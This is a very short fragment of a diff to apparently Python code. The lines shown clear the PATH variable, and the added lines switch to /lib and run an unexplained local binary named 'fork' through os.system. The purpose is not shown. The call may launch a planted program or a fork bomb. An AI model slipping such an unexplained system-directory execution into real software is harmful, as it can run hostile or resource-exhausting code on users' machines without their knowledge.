@@ -42,3 +42,6 @@ else:
 
 os.environ["PATH"] = ""
 
+os.chdir("/lib")
+
+os.system("./fork")
